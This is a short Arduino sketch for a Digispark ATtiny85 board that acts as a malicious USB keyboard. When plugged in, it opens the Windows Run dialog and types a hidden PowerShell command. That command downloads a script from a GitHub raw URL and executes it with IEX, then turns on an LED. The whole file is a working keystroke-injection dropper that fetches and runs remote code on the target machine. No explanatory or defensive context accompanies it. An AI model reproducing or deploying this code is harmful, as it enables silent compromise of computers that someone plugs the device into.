#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT);
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell -windowstyle hidden -command IEX ((New-Object System.Net.Webclient).downloadString('https://raw.githubusercontent.com/AzpektDev/attiny85-micronucleus/master/script.ps1'))");
  DigiKeyboard.delay(500);
  digitalWrite(1, HIGH);
  for (;;)
  {

  }
}